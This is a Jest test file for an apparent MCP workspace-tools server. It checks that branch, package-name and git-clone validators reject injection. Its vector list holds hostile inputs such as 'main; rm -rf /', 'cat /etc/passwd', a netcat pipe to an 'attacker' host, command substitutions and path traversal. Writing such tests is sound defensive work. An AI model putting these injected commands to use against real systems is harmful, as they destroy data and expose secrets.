/**
 * R5 Fix 2 workspace-tools-mcp tests.
 *
 * TE-R5-004 enumeration: 21 shell metacharacter vectors must be rejected by
 * branch/package validators. TE-R5-009 coverage: PnP indicators, push gating,
 * denied workspace_run commands.
 */
import { validateBranch, validatePackageNames, validateGitCloneTarget } from '../workspace-tools-mcp';

// R5 TE-R5-004: full shell metacharacter vector set
const SHELL_METACHAR_VECTORS: Array<{ input: string; reason: string }> = [
  { input: 'main; rm -rf /', reason: 'semicolon' },
  { input: 'main && cat /etc/passwd', reason: 'double ampersand' },
  { input: 'main | nc attacker 4444', reason: 'pipe' },
  { input: 'main$(whoami)', reason: 'command substitution parens' },
  { input: 'main`whoami`', reason: 'command substitution backtick' },
  { input: 'main\n; bash', reason: 'newline' },
  { input: 'main\r; bash', reason: 'carriage return' },
  { input: 'main\0; bash', reason: 'null byte' },
  { input: 'main\t; bash', reason: 'tab' },
  { input: 'main > /tmp/pwned', reason: 'output redirect' },
  { input: 'main 2>&1', reason: 'stderr redirect' },
  { input: 'main < /etc/passwd', reason: 'input redirect' },
  { input: 'main*', reason: 'glob star in identifier context' },
  { input: 'main?', reason: 'glob question in identifier context' },
  { input: 'main[abc]', reason: 'glob bracket in identifier context' },
  { input: 'main{a,b}', reason: 'brace expansion' },
  { input: '../etc/passwd', reason: 'path traversal' },
  { input: '$IFS', reason: 'env var' },
  { input: '~root/secret', reason: 'tilde expansion' },
  { input: '!!', reason: 'history expansion' },
  { input: 'main\\; bash', reason: 'escaped semicolon' },
];

describe('branch/package/arg validation rejects shell metacharacters (TE-R5-004)', () => {
  test.each(SHELL_METACHAR_VECTORS)('validateBranch rejects: $reason ($input)', ({ input }) => {
    expect(() => validateBranch(input)).toThrow();
  });

  test.each(SHELL_METACHAR_VECTORS)('validatePackageNames rejects: $reason ($input)', ({ input }) => {
    expect(() => validatePackageNames([input])).toThrow();
  });
});

describe('validateBranch additional rules', () => {
  it('rejects HEAD', () => expect(() => validateBranch('HEAD')).toThrow(/forbidden/));
  it('rejects FETCH_HEAD', () => expect(() => validateBranch('FETCH_HEAD')).toThrow(/forbidden/));
  it('rejects refspec syntax with colon', () => expect(() => validateBranch('main:refs/heads/other')).toThrow());
  it('rejects + prefix (force push)', () => expect(() => validateBranch('+main')).toThrow());
  it('rejects -- prefix (flag-like)', () => expect(() => validateBranch('--foo')).toThrow());
  it('accepts normal branch name', () => expect(() => validateBranch('feature/my-change')).not.toThrow());
});

describe('validateGitCloneTarget', () => {
  it('constructs canonical https URL from owner/repo', () => {
    const url = validateGitCloneTarget('acme', 'runtime');
    expect(url).toBe('https://github.com/acme/runtime.git');
  });

  it('rejects invalid owner (leading dot)', () => {
    expect(() => validateGitCloneTarget('.hidden', 'x')).toThrow(/invalid owner|cannot start/);
  });

  it('rejects invalid repo (leading dash)', () => {
    expect(() => validateGitCloneTarget('x', '-evil')).toThrow(/invalid repo|cannot start/);
  });
});
